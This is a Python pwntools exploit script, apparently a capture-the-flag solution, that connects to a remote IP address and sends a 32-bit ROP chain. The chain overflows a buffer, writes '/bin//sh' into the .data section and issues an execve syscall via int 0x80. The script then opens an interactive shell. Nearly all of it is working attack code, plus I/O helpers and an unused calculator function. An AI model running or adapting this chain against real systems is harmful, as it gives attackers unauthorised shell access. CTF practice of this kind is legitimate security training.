import time
from pwn import *
from LibcSearcher import *

# from ctypes import *
# from struct import pack
# from ae64 import AE64

# io = remote("192.168.170.128", 1234)
# context.arch = "amd64"

# io = remote("chall.pwnable.tw", 10100)
# io = remote("61.147.171.105",   51565)
# io = remote("node4.buuoj.cn", 27014)
# io = remote("dasctf_sixbytes.node.game.sycsec.com", 30088)
# io = remote("node5.anna.nssctf.cn", 28604)
io = remote("112.6.51.212", 31159)


# io = process('./q2')

# gdb.attach(io)
# elf = ELF('./alloc')
# libc = ELF('./libc-2.31.so')


def s(a):
    io.send(a)


def sa(a, b):
    io.sendafter(a, b)


def sl(a):
    io.sendline(a)


def sal(a, b):
    io.sendlineafter(a, b)


def r(n):
    return (io.recv(n))


def ru(a):
    return io.recvuntil(a)


def rl():
    return io.recvline()


def sla(a, b):
    io.sendlineafter(a, b)


def debug():
    gdb.attach(io)
    pause()


def get_addr():
    return u64(ru(b'\x7f')[-6:].ljust(8, b'\x00'))


def inter():
    return io.interactive()


def print_addr(name, addr):
    print(f"{name} =", addr)


def operater(optr, opnd1, opnd2):
    optr_str_list = ['×', '**', '+', '-', '÷', '%']
    if optr in optr_str_list:
        index = optr_str_list.index(optr)
    if optr == optr_str_list[0]:  # 乘法
        result = opnd1 * opnd2
    elif optr == optr_str_list[1]:  # 幂运算
        result = opnd1 ** opnd2
    elif optr == optr_str_list[2]:  # 加法
        result = opnd1 + opnd2
    elif optr == optr_str_list[3]:  # 减法
        result = opnd1 - opnd2
    elif optr == optr_str_list[4]:  # 除法
        if opnd2 != 0:  # 避免除以零错误
            result = opnd1 / opnd2
        else:
            result = "Error: Division by zero"
    elif optr == optr_str_list[5]:  # 取余
        if opnd2 != 0:  # 避免取余时除数为零
            result = opnd1 % opnd2
        else:
            result = "Error: Modulo by zero"
    else:
        result = "Error: Invalid operator"

    return result


context(os='linux', arch='amd64')
# context(os='linux', arch='amd64', log_level="debug")

from struct import pack

p = b'a'*(0x1c+4)

p += pack('<I', 0x0804993d) # pop edx ; ret
p += pack('<I', 0x080e3040) # @ .data
p += pack('<I', 0x080aa06a) # pop eax ; ret
p += b'/bin'
p += pack('<I', 0x080537da) # mov dword ptr [edx], eax ; ret

p += pack('<I', 0x0804993d) # pop edx ; ret
p += pack('<I', 0x080e3044) # @ .data + 4
p += pack('<I', 0x080aa06a) # pop eax ; ret
p += b'//sh'
p += pack('<I', 0x080537da) # mov dword ptr [edx], eax ; ret

p += pack('<I', 0x0804901e) # pop ebx ; ret
p += pack('<I', 0x080e3040) # @ .data
p += pack('<I', 0x0804993f) # pop ecx ; ret
p+=p32(0)
p += pack('<I', 0x0804993d) # pop edx ; ret
p+=p32(0)
p += pack('<I', 0x080aa06a) # pop eax ; ret
p+=p32(0xb)
p += pack('<I', 0x08049b62) # int 0x80
print(len(p))
sl(p)

inter()
